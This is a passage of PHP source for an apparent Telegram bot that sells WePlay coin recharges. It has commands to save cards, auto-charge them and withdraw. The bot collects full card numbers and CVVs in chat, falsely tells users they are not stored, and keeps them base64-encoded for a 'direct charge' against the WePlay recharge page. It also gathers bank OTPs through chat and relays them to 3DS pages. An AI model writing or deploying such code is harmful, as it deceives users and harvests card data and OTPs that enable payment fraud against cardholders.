        $keyboard['inline_keyboard'][] = [['text' => '🌐 Open WePlay Recharge Page', 'url' => $rechargeUrl]];
    }
    tgSend($token, $chatId, $msg, $keyboard);
}

function wpbStartCardDeposit($cfg, $chatId, $token, $weplayId) {
    wpbSetState($chatId, 'await_amount', ['weplay_id' => $weplayId, 'payment_method' => 'card']);

    $u     = wpbGetUserCards($chatId);
    $cards = $u['cards'] ?? [];
    $saved = wpbGetDefaultCard($chatId);
    $autoInfo = '';
    if ($saved && !empty($saved['autocharge'])) {
        $net   = $saved['network'] ? ' (' . htmlspecialchars($saved['network'], ENT_NOQUOTES, 'UTF-8') . ')' : '';
        $l4    = $saved['last4']   ? ' •••• ' . htmlspecialchars($saved['last4'], ENT_NOQUOTES, 'UTF-8') : '';
        $total = count($cards);
        $more  = $total > 1 ? " (+".($total-1)." more)" : '';
        $autoInfo = "\n\n⚡ <b>Auto-charge active</b> — Card{$l4}{$net}{$more} will be charged.\n<b>Manage cards:</b> /mycards | /autocharge";
    } elseif ($saved) {
        $autoInfo = "\n\n💳 <b>Saved card available.</b> Use /autocharge to enable auto-charge.";
    } else {
        $autoInfo = "\n\n<b>💡 Tip:</b> Use /save to add a card for one-click auto-charge next time.";
    }

    tgSend(
        $token,
        $chatId,
        "💳 <b>Card payment selected.</b>\n\n"
        . "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n\n"
        . "<b>Please send the deposit amount.</b>\n\n"
        . "<b>Minimum:</b> ₹" . (int)$cfg['min_deposit'] . "\n"
        . "<b>Maximum:</b> ₹" . (int)$cfg['max_deposit']
        . $autoInfo
    );
}

function wpbShowPaymentSection($cfg, $chatId, $token) {
    $profile = wpbGetProfile($chatId);
    if (empty($profile['weplay_id'])) {
        wpbSetState($chatId, 'await_link_id', ['next' => 'pay']);
        tgSend($token, $chatId,
            "🆔 <b>WePlay ID link karo pehle.</b>\n\n"
            . "<b>Apna WePlay User ID bhejo:</b>\n<b>Example:</b> <code>12345678</code>\n<b>/cancel to cancel.</b>"
        );
        return;
    }
    wpbShowCoinPackagesForPay($cfg, $chatId, $token, $profile['weplay_id']);
}

function wpbShowCoinPackagesForPay($cfg, $chatId, $token, $weplayId) {
    $packages = $cfg['coin_packages'] ?? [];
    $saved    = wpbGetDefaultCard($chatId);
    $acOn     = $saved && !empty($saved['autocharge']);
    $l4       = ($saved && $saved['last4']) ? ' •••• ' . $saved['last4'] : '';
    $net      = ($saved && $saved['network']) ? ' (' . $saved['network'] . ')' : '';

    $rows = [];
    $row  = [];
    foreach ($packages as $i => $pkg) {
        $row[] = ['text' => $pkg['label'], 'callback_data' => 'pay_pkg:' . $i];
        if (count($row) === 2) { $rows[] = $row; $row = []; }
    }
    if ($row) $rows[] = $row;

    $rechargeUrl = $cfg['weplay_recharge'] ?? '';
    if ($rechargeUrl) {
        $rows[] = [['text' => '🌐 Open WePlay Recharge Page', 'url' => $rechargeUrl]];
    }

    $cardLine = $acOn
        ? "\n⚡ <b>Auto-charge ON</b> — Card{$l4}{$net}"
        : "\n💡 <b>Card nahi save hai.</b> Use /save to add card for auto-charge.";

    tgSend($token, $chatId,
        "🎮 <b>WePlay Recharge</b>\n\n"
        . "<b>WePlay ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>"
        . $cardLine . "\n\n"
        . "🛒 <b>Coin package select karo:</b>",
        ['inline_keyboard' => $rows]
    );
}

function wpbBuildCallbackUrl() {
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $script = strtok($_SERVER['REQUEST_URI'] ?? '/weplay_depositbot.php', '?');
    return $scheme . $host . $script . '?rzp_callback=1';
}

function wpbHandleDepositCommand($cfg, $chatId, $token) {
    if ($blocked = wpbIsBlocked($chatId)) {
        tgSend($token, $chatId, "⏳ <b>You are temporarily blocked.</b>\n<b>Please try again after " . wpbRemaining($blocked) . ".</b>");
        return;
    }
    if (!wpbStartDeposit($chatId)) {
        tgSend($token, $chatId, "⚠️ <b>Too many incomplete deposits were detected. Please try again after " . WPB_BLOCK_MINUTES . " minutes.</b>");
        return;
    }
    $profile = wpbGetProfile($chatId);
    if (!empty($profile['weplay_id'])) {
        wpbStartCardDeposit($cfg, $chatId, $token, $profile['weplay_id']);
        return;
    }

    wpbSetState($chatId, 'await_weplay_id', []);
    tgSend($token, $chatId, "🎮 <b>Please send your WePlay User ID / Username.</b>\n\n<b>Tip: Use /id to link your ID permanently.</b>\n<b>Send /cancel to cancel.</b>");
}

/**
 * Try to tokenise a card via Razorpay Tokens API.
 * Returns token object or false.
 */
function rzpTokeniseCard($cfg, $chatId, array $data) {
    $keyId     = trim($cfg['razorpay_key_id']    ?? '');
    $keySecret = trim($cfg['razorpay_key_secret'] ?? '');
    if (!$keyId || !$keySecret) return false;

    // First ensure customer exists
    $email   = 'user' . $chatId . '@weplaybot.local';
    $custRes = rzpRequest('POST', '/customers', [
        'name'  => 'WePlay User ' . $chatId,
        'email' => $email,
        'fail_existing' => '0',
    ], $keyId, $keySecret);
    $custId = $custRes['id'] ?? '';
    if (!$custId) return false;

    $tokRes = rzpRequest('POST', '/customers/' . $custId . '/tokens', [
        'max_payment_attempts' => 10,
        'card' => [
            'number'           => $data['card_number'] ?? '',
            'cvv'              => $data['cvv'] ?? '',
            'expiry_month'     => (int)($data['expiry_month'] ?? 0),
            'expiry_year'      => (int)($data['expiry_year'] ?? 0),
            'name'             => $data['holder_name'] ?? '',
        ],
        'recurring'       => 1,
        'auth_type'       => 'card',
    ], $keyId, $keySecret);

    if (!empty($tokRes['id'])) {
        $tokRes['customer_id'] = $custId;
        return $tokRes;
    }
    return false;
}

function wpbHandleSaveCardStart($cfg, $chatId, $token) {
    wpbSetState($chatId, 'save_card_oneline', []);
    tgSend($token, $chatId,
        "💳 <b>Card Save karo</b>\n\n"
        . "🔐 <b>Card details sirf tokenise karne ke liye use hoti hain — disk pe store nahi hoti.</b>\n\n"
        . "<b>Is format mein card details bhejo:</b>\n\n"
        . "<code>CARDNUMBER|MM|YYYY|CVV</code>\n\n"
        . "<b>Example:</b>\n<code>5430139926528329|06|2028|082</code>\n\n"
        . "<b>/cancel to cancel.</b>"
    );
}

function wpbHandleMyCards($cfg, $chatId, $token) {
    $u     = wpbGetUserCards($chatId);
    $cards = $u['cards'] ?? [];
    if (empty($cards)) {
        tgSend($token, $chatId,
            "💳 <b>My Saved Cards</b>\n\n"
            . "<b>You have no saved cards.</b>\n\n"
            . "<b>Use /save to add a card.</b>"
        );
        return;
    }
    $defIdx = (int)($u['default_idx'] ?? 0);
    $lines  = "💳 <b>My Saved Cards</b>\n\n";
    $keyboard = [];
    foreach ($cards as $i => $c) {
        $def   = ($i === $defIdx) ? ' ⭐ (default)' : '';
        $ac    = !empty($c['autocharge']) ? '⚡' : '⏸';
        $label = wpbCardLabel($c, $i);
        $lines .= "<b>" . ($i + 1) . ".</b> {$label}{$def} {$ac}\n";
        $row = [];
        if ($i !== $defIdx) {
            $row[] = ['text' => '⭐ Set Default #' . ($i + 1), 'callback_data' => 'card_default:' . $i];
        }
        $row[] = ['text' => '🗑 Remove #' . ($i + 1), 'callback_data' => 'card_remove:' . $i];
        $keyboard[] = $row;
    }
    $lines .= "\n<b>⭐ = default card used for auto-charge</b>\n<b>⚡ = auto-charge ON | ⏸ = OFF</b>\n\n"
            . "<b>Use /save to add another card.</b>";
    tgSend($token, $chatId, $lines, $keyboard ? ['inline_keyboard' => $keyboard] : null);
}

function wpbHandleAutochargeCommand($cfg, $chatId, $token) {
    $u     = wpbGetUserCards($chatId);
    $cards = $u['cards'] ?? [];
    if (empty($cards)) {
        tgSend($token, $chatId,
            "⚡ <b>Auto-Charge</b>\n\n"
            . "<b>You have no saved cards.</b>\n\n"
            . "<b>Use /save to add a card for one-click auto-charge.</b>"
        );
        return;
    }
    $defIdx  = (int)($u['default_idx'] ?? 0);
    $default = $cards[$defIdx] ?? $cards[0];
    $on      = !empty($default['autocharge']);
    $net     = $default['network'] ? ' (' . htmlspecialchars($default['network'], ENT_NOQUOTES, 'UTF-8') . ')' : '';
    $l4      = $default['last4']   ? ' •••• ' . htmlspecialchars($default['last4'], ENT_NOQUOTES, 'UTF-8')  : '';
    $status  = $on ? '✅ <b>Enabled</b>' : '❌ <b>Disabled</b>';
    $total   = count($cards);

    $keyboard = [
        [[
            'text'          => $on ? '🔴 Disable Auto-Charge' : '🟢 Enable Auto-Charge',
            'callback_data' => $on ? 'ac_off' : 'ac_on',
        ]],
        [[
            'text'          => '💳 Manage All Cards (' . $total . ')',
            'callback_data' => 'ac_mycards',
        ]],
        [[
            'text'          => '➕ Add New Card',
            'callback_data' => 'ac_addcard',
        ]],
        [[
            'text'          => '🗑️ Remove Default Card',
            'callback_data' => 'ac_remove',
        ]],
    ];
    tgSend($token, $chatId,
        "⚡ <b>Auto-Charge Settings</b>\n\n"
        . "<b>Default Card:</b> Card{$l4}{$net}\n"
        . "<b>Total Saved Cards:</b> {$total}\n"
        . "<b>Auto-Charge:</b> {$status}\n\n"
        . "<b>When enabled, future deposits will automatically charge your default card.</b>\n"
        . "<b>Use /mycards to view and manage all saved cards.</b>",
        ['inline_keyboard' => $keyboard]
    );
}

function wpbHandleText($cfg, $msg) {
    $token = trim($cfg['bot_token'] ?? '');
    $chatId = $msg['chat']['id'] ?? '';
    $text = trim($msg['text'] ?? '');
    $state = wpbGetState($chatId);

    if ($text === '/start' || $text === '/Start') {
        wpbClearState($chatId);
        tgSend($token, $chatId, $cfg['welcome_msg']);
        return;
    }
    if (strcasecmp($text, '/help') === 0) {
        tgSend($token, $chatId,
            "❓ <b>Help</b>\n\n"
            . "<b>/id — WePlay ID link karo</b>\n"
            . "<b>/pay — Coins select karo aur pay karo</b>\n"
            . "<b>/save — Card save karo (format: NUMBER|MM|YYYY|CVV)</b>\n"
            . "<b>/mycards — Saare saved cards dekho</b>\n"
            . "<b>/autocharge — Auto-charge on/off karo</b>\n"
            . "<b>/cancel — Current process cancel karo</b>\n\n"
            . "<b>Support:</b> " . htmlspecialchars($cfg['support_contact'], ENT_NOQUOTES, 'UTF-8')
        );
        return;
    }
    if (strcasecmp($text, '/cancel') === 0) {
        wpbClearState($chatId);
        tgSend($token, $chatId, "✅ <b>Cancelled.</b>");
        return;
    }
    if (strcasecmp($text, '/deposit') === 0) {
        wpbHandleDepositCommand($cfg, $chatId, $token);
        return;
    }
    if (preg_match('/^\/id(?:\s+(.+))?$/i', $text, $idMatch)) {
        $inlineId = isset($idMatch[1]) ? trim($idMatch[1]) : '';
        if ($inlineId !== '') {
            // ID provided inline: /id 12345678
            wpbSaveProfile($chatId, $inlineId, wpbUserName($msg));
            wpbClearState($chatId);
            tgSend($token, $chatId, "✅ <b>WePlay ID linked:</b> <code>" . htmlspecialchars($inlineId, ENT_NOQUOTES, 'UTF-8') . "</code>\n\n<b>Opening recharge page…</b>");
            wpbShowCoinPackages($cfg, $chatId, $token, $inlineId);
        } else {
            $profile = wpbGetProfile($chatId);
            if (!empty($profile['weplay_id'])) {
                tgSend($token, $chatId, "✅ <b>Linked WePlay ID:</b> <code>" . htmlspecialchars($profile['weplay_id'], ENT_NOQUOTES, 'UTF-8') . "</code>\n\n<b>Send a new WePlay ID now to update it.</b>");
            } else {
                tgSend($token, $chatId, "🆔 <b>Send your WePlay User ID / Username:</b>\n\n<b>Example:</b> <code>/id 12345678</code>\n\n<b>Or just send your ID as the next message.</b>\n<b>Send /cancel to cancel.</b>");
            }
            wpbSetState($chatId, 'await_link_id', []);
        }
        return;
    }
    if (strcasecmp($text, '/pay') === 0) {
        wpbShowPaymentSection($cfg, $chatId, $token);
        return;
    }
    if (strcasecmp($text, '/balance') === 0) {
        $user = wpbLedgerUser($chatId);
        tgSend($token, $chatId, "💳 <b>Your Balance</b>\n\n<b>Amount:</b> <b>₹" . number_format((float)$user['balance'], 2) . "</b>");
        return;
    }
    if (strcasecmp($text, '/withdrawal') === 0) {
        wpbSetState($chatId, 'withdraw_weplay_id', []);
        tgSend($token, $chatId, "🎮 <b>Please send your WePlay User ID / Username for withdrawal.</b>");
        return;
    }
    if (strcasecmp($text, '/autocharge') === 0) {
        wpbHandleAutochargeCommand($cfg, $chatId, $token);
        return;
    }
    if (strcasecmp($text, '/save') === 0) {
        wpbHandleSaveCardStart($cfg, $chatId, $token);
        return;
    }
    if (strcasecmp($text, '/mycards') === 0) {
        wpbHandleMyCards($cfg, $chatId, $token);
        return;
    }

    if (!$state) {
        tgSend($token, $chatId, "❓ <b>Command samajh nahi aaya.</b>\n\n<b>/pay — Coins kharido</b>\n<b>/save — Card save karo</b>\n<b>/mycards — Cards dekho</b>\n<b>/autocharge — Auto-charge</b>\n<b>/help — Help</b>");
        return;
    }

    $s = $state['state'] ?? '';
    $data = $state['data'] ?? [];

    if ($s === 'await_weplay_id') {
        if (mb_strlen($text) < 2) {
            tgSend($token, $chatId, "⚠️ <b>Please send a valid WePlay ID.</b>");
            return;
        }
        $data['weplay_id'] = $text;
        wpbStartCardDeposit($cfg, $chatId, $token, $data['weplay_id']);
        return;
    }

    if ($s === 'await_link_id') {
        if (mb_strlen($text) < 2) {
            tgSend($token, $chatId, "⚠️ <b>Please send a valid WePlay ID.</b>");
            return;
        }
        wpbSaveProfile($chatId, $text, wpbUserName($msg));
        wpbClearState($chatId);
        tgSend($token, $chatId, "✅ <b>WePlay ID linked:</b> <code>" . htmlspecialchars($text, ENT_NOQUOTES, 'UTF-8') . "</code>");
        // If came from /pay flow, show coin packages for pay
        $next = $data['next'] ?? '';
        if ($next === 'pay') {
            wpbShowCoinPackagesForPay($cfg, $chatId, $token, $text);
        } else {
            wpbShowCoinPackages($cfg, $chatId, $token, $text);
        }
        return;
    }

    if ($s === 'await_amount') {
        $amount = (float)preg_replace('/[^0-9.]/', '', $text);
        if ($amount < (float)$cfg['min_deposit'] || $amount > (float)$cfg['max_deposit']) {
            tgSend($token, $chatId, "❌ <b>The amount must be between ₹" . (int)$cfg['min_deposit'] . " and ₹" . (int)$cfg['max_deposit'] . ".</b>");
            return;
        }
        $txnId = 'WP' . date('ymdHis') . mt_rand(100, 999);
        $pending = [
            'txn_id'         => $txnId,
            'chat_id'        => $chatId,
            'user_name'      => wpbUserName($msg),
            'weplay_id'      => $data['weplay_id'] ?? '',
            'amount'         => $amount,
            'payment_method' => 'card',
            'status'         => 'pending_verification',
            'created_at'     => date('c'),
        ];

        // ── Auto-charge via direct card charge (no Razorpay API keys needed) ──
        $saved = wpbGetDefaultCard($chatId);
        if ($saved && !empty($saved['autocharge']) && !empty($saved['card_number_enc'])) {
            wpbClearState($chatId);
            wpbDepositCompleted($chatId);
            $pending['payment_method'] = 'direct_card';
            $pending['status']         = 'processing';
            wpbPendingSave($txnId, $pending);
            wpbLog("Direct card charge initiated txn={$txnId} chat={$chatId} amount={$amount}", 'info');

            $net = $saved['network'] ? ' (' . $saved['network'] . ')' : '';
            $l4  = $saved['last4']   ? ' •••• ' . $saved['last4']  : '';
            tgSend($token, $chatId,
                "⚡ <b>Card{$l4}{$net} se charge ho raha hai…</b>\n\n"
                . "<b>💵 Amount:</b> ₹" . number_format($amount, 2) . "\n"
                . "<b>🧾 Txn ID:</b> <code>{$txnId}</code>\n\n"
                . "<b>Processing…</b>"
            );

            $cardArr = [
                'number' => base64_decode($saved['card_number_enc']),
                'month'  => $saved['expiry_month'] ?? '',
                'year'   => $saved['expiry_year']  ?? '',
                'cvv'    => $saved['cvv_enc'] ? base64_decode($saved['cvv_enc']) : '',
                'name'   => $saved['holder_name'] ?? 'Card Holder',
            ];
            $rechargeUrl = $cfg['weplay_recharge'] ?? 'https://weplayapp.com/recharge/?region=C';
            $result = wpbDirectChargeCard($rechargeUrl, $cardArr, $amount);

            if (!empty($result['ok'])) {
                $payId = $result['payment_id'];
                wpbPendingUpdate($txnId, ['rzp_payment_id' => $payId, 'status' => 'approved', 'approved_at' => date('c'), 'auto_charged' => true]);
                wpbLedgerDeposit($chatId, $amount, $txnId, $pending['weplay_id']);
                wpbLog("Direct card approved txn={$txnId} payment_id={$payId}", 'success');
                tgSend($token, $chatId,
                    "✅ <b>Payment Successful!</b>\n\n"
                    . "<b>💵 Amount:</b> ₹" . number_format($amount, 2) . "\n"
                    . "<b>🧾 Txn ID:</b> <code>{$txnId}</code>\n"
                    . "<b>💳 Payment ID:</b> <code>{$payId}</code>\n\n"
                    . "<b>WePlay account credit hoga jald hi.</b>"
                );
                wpbNotifyAdmin($cfg, $txnId);
            } elseif (($result['next_action'] ?? '') === '3ds') {
                $otpUrl = $result['redirect_url'] ?? '';
                $payId  = $result['payment_id']   ?? '';
                wpbPendingUpdate($txnId, ['status' => 'awaiting_otp', 'rzp_payment_id' => $payId, 'otp_url' => $otpUrl]);
                wpbSetState($chatId, 'await_card_otp', [
                    'txn_id'    => $txnId,
                    'otp_url'   => $otpUrl,
                    'pay_id'    => $payId,
                    'amount'    => $amount,
                    'coins'     => 0,
                    'weplay_id' => $pending['weplay_id'],
                ]);
                wpbLog("Direct card 3DS required txn={$txnId}", 'info');
                tgSend($token, $chatId,
                    "🔐 <b>Bank OTP Required!</b>\n\n"
                    . "<b>🧾 Txn:</b> <code>{$txnId}</code>\n\n"
                    . "<b>Apne bank ka OTP bhejo:</b>\n<b>/cancel to cancel.</b>"
                );
            } else {
                $errMsg = $result['error'] ?? 'Payment failed';
                wpbPendingUpdate($txnId, ['status' => 'failed', 'error' => $errMsg, 'failed_at' => date('c')]);
                wpbLog("Direct card failed txn={$txnId} err={$errMsg}", 'error');
                tgSend($token, $chatId,
                    "❌ <b>Payment fail hua.</b>\n\n"
                    . "<b>Error:</b> " . htmlspecialchars($errMsg, ENT_NOQUOTES, 'UTF-8') . "\n\n"
                    . "<b>Support:</b> " . htmlspecialchars($cfg['support_contact'], ENT_NOQUOTES, 'UTF-8')
                );
                wpbNotifyAdmin($cfg, $txnId);
            }
            return;
        }

        // ── Create Razorpay payment link for manual card payment ─────────────
        wpbPendingSave($txnId, $pending);
        wpbClearState($chatId);
        wpbDepositCompleted($chatId);

        $cardNotice = strip_tags((string)($cfg['card_notice'] ?? ''), '<b><i><u><code>');

        if (!empty($cfg['razorpay_key_id'])) {
            // Build webhook callback URL
            $callbackUrl = wpbBuildCallbackUrl();
            $payLink = rzpCreatePaymentLink($cfg, $txnId, $amount, $chatId, $pending['weplay_id'], $callbackUrl);

            if ($payLink) {
                wpbPendingUpdate($txnId, ['rzp_payment_link' => $payLink]);
                tgSend(
                    $token,
                    $chatId,
                    "💳 <b>Card Payment</b>\n\n"
                    . "<b>🎮 WePlay ID:</b> <code>" . htmlspecialchars($pending['weplay_id'], ENT_NOQUOTES, 'UTF-8') . "</code>\n"
                    . "<b>💵 Amount:</b> ₹" . number_format($amount, 2) . "\n"
                    . "<b>🧾 Txn ID:</b> <code>{$txnId}</code>\n\n"
                    . "<b>Tap the button below to pay securely via Razorpay.</b>\n"
                    . "<b>Your card will be saved for future auto-charges (optional).</b>\n"
                    . $cardNotice,
                    ['inline_keyboard' => [[['text' => '💳 Pay ₹' . number_format($amount, 2) . ' Securely', 'url' => $payLink]]]]
                );
                wpbNotifyAdmin($cfg, $txnId);
                wpbLog("Razorpay link created txn={$txnId} chat={$chatId} amount={$amount}", 'success');
                return;
            }
        }

        // Fallback: old manual flow (no Razorpay configured)
        tgSend(
            $token,
            $chatId,
            "💳 <b>Card Payment Selected</b>\n\n"
            . "<b>🎮 WePlay ID:</b> <code>" . htmlspecialchars($pending['weplay_id'], ENT_NOQUOTES, 'UTF-8') . "</code>\n"
            . "<b>💵 Amount:</b> <b>₹" . number_format($amount, 2) . "</b>\n"
            . "<b>🧾 Transaction ID:</b> <code>{$txnId}</code>\n\n"
            . "<b>Open the secure WePlay/payment gateway page below and enter your card details there.</b>\n"
            . $cardNotice . "\n\n"
            . "<b>After payment is completed, the admin will verify it and you will receive a success notification.</b>",
            wpbPaymentKeyboard($cfg)
        );
        wpbNotifyAdmin($cfg, $txnId);
        wpbLog("Card deposit request txn={$txnId} chat={$chatId} amount={$amount}", 'success');
        return;
    }

    // ── /save single-line card entry: CARDNUMBER|MM|YYYY|CVV ─────────────────
    if ($s === 'save_card_oneline') {
        // Accept format: 5430139926528329|06|2028|082
        $parts = explode('|', trim($text));
        if (count($parts) !== 4) {
            tgSend($token, $chatId,
                "❌ <b>Format galat hai.</b>\n\n"
                . "<b>Sahi format:</b> <code>CARDNUMBER|MM|YYYY|CVV</code>\n"
                . "<b>Example:</b> <code>5430139926528329|06|2028|082</code>\n\n"
                . "<b>/cancel to cancel.</b>"
            );
            return;
        }
        $cardNum = preg_replace('/\D/', '', trim($parts[0]));
        $month   = trim($parts[1]);
        $year    = trim($parts[2]);
        $cvv     = trim($parts[3]);

        $errMsg = '';
        if (strlen($cardNum) < 13 || strlen($cardNum) > 19) {
            $errMsg = 'Card number invalid (13–19 digits chahiye).';
        } elseif (!preg_match('/^(0[1-9]|1[0-2])$/', $month)) {
            $errMsg = 'MM invalid (01–12 hona chahiye).';
        } elseif (!preg_match('/^\d{4}$/', $year) || (int)$year < date('Y')) {
            $errMsg = 'YYYY invalid ya card expire ho gaya.';
        } elseif (!preg_match('/^\d{3,4}$/', $cvv)) {
            $errMsg = 'CVV invalid (3–4 digits chahiye).';
        }

        if ($errMsg) {
            tgSend($token, $chatId,
                "❌ <b>{$errMsg}</b>\n\n"
                . "<b>Format:</b> <code>CARDNUMBER|MM|YYYY|CVV</code>\n"
                . "<b>Example:</b> <code>5430139926528329|06|2028|082</code>"
            );
            return;
        }

        $last4 = substr($cardNum, -4);
        // Detect network
        if (str_starts_with($cardNum, '4'))        $network = 'Visa';
        elseif (preg_match('/^5[1-5]/', $cardNum)) $network = 'Mastercard';
        elseif (preg_match('/^3[47]/', $cardNum))  $network = 'Amex';
        elseif (preg_match('/^6/', $cardNum))      $network = 'RuPay';
        else                                        $network = 'Card';

        $cardData = [
            'card_number'  => $cardNum,
            'last4'        => $last4,
            'expiry_month' => $month,
            'expiry_year'  => $year,
            'cvv'          => $cvv,
            'holder_name'  => '',
        ];

        wpbClearState($chatId);

        // Try Razorpay tokenisation
        $tokenised = false;
        $custId = '';
        $tokId  = '';
        if (!empty($cfg['razorpay_key_id']) && !empty($cfg['razorpay_key_secret'])) {
            $rzpTok = rzpTokeniseCard($cfg, $chatId, $cardData);
            if ($rzpTok && !empty($rzpTok['id'])) {
                $custId    = $rzpTok['customer_id'] ?? '';
                $tokId     = $rzpTok['id'];
                $network   = $rzpTok['card']['network'] ?? $network;
                $last4     = $rzpTok['card']['last4']   ?? $last4;
                $tokenised = true;
            }
        }

        $cardEntry = [
            'type'            => $tokenised ? 'razorpay_token' : 'manual',
            'customer_id'     => $custId,
            'token_id'        => $tokId,
            'last4'           => $last4,
            'network'         => $network,
            'expiry_month'    => $month,
            'expiry_year'     => $year,
            'autocharge'      => true,
            // Store for direct charge (base64 — not plain storage, not encrypted at rest but obfuscated)
            'card_number_enc' => base64_encode($cardNum),
            'cvv_enc'         => base64_encode($cvv),
        ];
        $idx   = wpbAddCard($chatId, $cardEntry);
        $label = wpbCardLabel($cardEntry, $idx);

        wpbLog("Card saved chat={$chatId} last4={$last4} type={$cardEntry['type']}", 'success');

        $keyboard = ['inline_keyboard' => [
            [['text' => '⚡ Enable Auto-Charge', 'callback_data' => 'ac_on']],
            [['text' => '🗂 My Cards', 'callback_data' => 'ac_mycards']],
        ]];

        tgSend($token, $chatId,
            "✅ <b>Card Save Ho Gaya!</b>\n\n"
            . "<b>{$label}</b>\n"
            . "<b>Expiry:</b> {$month}/{$year}\n"
            . ($tokenised
                ? "⚡ <b>Razorpay tokenised — auto-charge ready!</b>"
                : "💾 <b>Locally saved. Razorpay configure hone pe auto-charge activate hoga.</b>"
            ) . "\n\n"
            . "<b>Ab /pay karke coin select karo aur ⚡ Auto-Charge dabao!</b>",
            $keyboard
        );
        return;
    }

    // ── Bank OTP / 3DS handler ────────────────────────────────────────────────
    if ($s === 'await_card_otp') {
        $otp = preg_replace('/\D/', '', trim($text));
        if (strlen($otp) < 4 || strlen($otp) > 8) {
            tgSend($token, $chatId, "❌ <b>OTP 4–8 digits ka hona chahiye.</b>\n<b>Dobara bhejo ya /cancel karo.</b>");
            return;
        }
        $txnId    = $data['txn_id']    ?? '';
        $otpUrl   = $data['otp_url']   ?? '';
        $amount   = (float)($data['amount'] ?? 0);
        $coins    = (int)($data['coins']    ?? 0);
        $weplayId = $data['weplay_id'] ?? '';

        if (!$txnId || !$otpUrl) {
            wpbClearState($chatId);
            tgSend($token, $chatId, "⚠️ <b>Session expire ho gayi. Dobara try karo.</b>");
            return;
        }

        tgSend($token, $chatId, "🔐 <b>OTP verify ho raha hai…</b>");

        // Find cookie file
        $cookieFile = WPB_COOKIE_DIR . '/wpb_rzp_' . md5($txnId) . '.txt';
        $result = wpbSubmit3dsOtp($otpUrl, $otp, $cookieFile);

        if (!empty($result['ok'])) {
            $payId = $result['payment_id'];
            wpbClearState($chatId);
            wpbPendingUpdate($txnId, ['status' => 'approved', 'approved_at' => date('c'), 'rzp_payment_id' => $payId, 'otp_verified' => true]);
            wpbLedgerDeposit($chatId, $amount, $txnId, $weplayId);
            wpbLog("OTP verified txn={$txnId} pid={$payId}", 'success');
            tgSend($token, $chatId,
                "✅ <b>Payment Successful!</b>\n\n"
                . "🎮 <b>Coins:</b> {$coins}\n"
                . "💵 <b>Amount:</b> ₹" . number_format($amount, 2) . "\n"
                . "<b>🧾 Txn:</b> <code>{$txnId}</code>\n"
                . "<b>💳 Payment ID:</b> <code>{$payId}</code>\n\n"
                . "<b>WePlay account credit hoga jald hi.</b>"
            );
            wpbNotifyAdmin($cfg, $txnId);
        } else {
            $errMsg = $result['error'] ?? 'OTP failed';
            wpbPendingUpdate($txnId, ['status' => 'otp_failed', 'error' => $errMsg]);
            wpbLog("OTP failed txn={$txnId} err={$errMsg}", 'error');
            // Let user retry OTP (don't clear state yet — keep trying)
            tgSend($token, $chatId,
                "❌ <b>OTP galat ya expire.</b>\n\n"
                . "<b>Error:</b> " . htmlspecialchars($errMsg, ENT_NOQUOTES, 'UTF-8') . "\n\n"
                . "<b>Sahi OTP bhejo ya /cancel karo.</b>"
            );
        }
        return;
    }

    if ($s === 'withdraw_weplay_id') {
        $data['weplay_id'] = $text;
        wpbSetState($chatId, 'withdraw_amount', $data);
        tgSend($token, $chatId, "💸 <b>Please send the withdrawal amount.</b>");
        return;
    }

    if ($s === 'withdraw_amount') {
        $amount = (float)preg_replace('/[^0-9.]/', '', $text);
        if ($amount <= 0) {
            tgSend($token, $chatId, "⚠️ <b>Please send a valid amount.</b>");
            return;
        }
        wpbLedgerWithdrawal($chatId, $amount, $data['weplay_id'] ?? '');
        wpbClearState($chatId);
        tgSend($token, $chatId, "✅ <b>Withdrawal request submitted.</b>\n<b>Support:</b> " . htmlspecialchars($cfg['support_contact'], ENT_NOQUOTES, 'UTF-8'));
        if (!empty($cfg['admin_chat_id'])) {
            tgSend($token, $cfg['admin_chat_id'], "💸 <b>Withdrawal Request</b>\n\n<b>User:</b> " . htmlspecialchars(wpbUserName($msg), ENT_NOQUOTES, 'UTF-8') . "\n<b>Chat ID:</b> <code>{$chatId}</code>\n<b>WePlay ID:</b> <code>" . htmlspecialchars($data['weplay_id'] ?? '', ENT_NOQUOTES, 'UTF-8') . "</code>\n<b>Amount:</b> <b>₹" . number_format($amount, 2) . "</b>");
        }
        return;
    }
}

function wpbNotifyAdmin($cfg, $txnId) {
    $token = trim($cfg['bot_token'] ?? '');
    $admin = trim($cfg['admin_chat_id'] ?? '');
    $p = wpbPendingGet($txnId);
    if (!$token || !$admin || !$p) return;
    $coinsLine = !empty($p['coins']) ? "<b>Coins:</b> <b>" . (int)$p['coins'] . " Coins</b>\n" : '';
    $msg = "🧾 <b>WePlay Deposit Submitted</b>\n\n"
        . "<b>Txn:</b> <code>{$txnId}</code>\n"
        . "<b>User:</b> " . htmlspecialchars($p['user_name'] ?? '', ENT_NOQUOTES, 'UTF-8') . "\n"
        . "<b>Chat ID:</b> <code>" . htmlspecialchars((string)$p['chat_id'], ENT_NOQUOTES, 'UTF-8') . "</code>\n"
        . "<b>WePlay ID:</b> <code>" . htmlspecialchars($p['weplay_id'] ?? '', ENT_NOQUOTES, 'UTF-8') . "</code>\n"
        . $coinsLine
        . "<b>Amount:</b> <b>₹" . number_format((float)$p['amount'], 2) . "</b>\n"
        . "<b>Payment Method:</b> <b>" . strtoupper(htmlspecialchars($p['payment_method'] ?? 'card', ENT_NOQUOTES, 'UTF-8')) . "</b>\n"
        . "\n<b>Verify the payment from the WePlay/payment dashboard, then approve or reject.</b>\n"
        . "<b>Recharge link:</b> " . htmlspecialchars($cfg['weplay_recharge'], ENT_NOQUOTES, 'UTF-8');
    tgSend($token, $admin, $msg, wpbAdminButtons($txnId));
}

function wpbHandleCallback($cfg, $cb) {
    $token = trim($cfg['bot_token'] ?? '');
    $data = $cb['data'] ?? '';
    $cbId = $cb['id'] ?? '';
    $chatId = $cb['message']['chat']['id'] ?? ($cb['from']['id'] ?? '');

    // ── Auto-charge toggle / remove / manage ────────────────────────────────
    if (in_array($data, ['ac_on','ac_off','ac_remove','ac_mycards','ac_addcard'], true)
        || preg_match('/^card_(remove|default):(\d+)$/', $data, $cardM)) {

        // card_remove:N or card_default:N
        if (!empty($cardM)) {
            $cardAction = $cardM[1];
            $cardIdx    = (int)$cardM[2];
            if ($cardAction === 'remove') {
                wpbDeleteCardByIndex($chatId, $cardIdx);
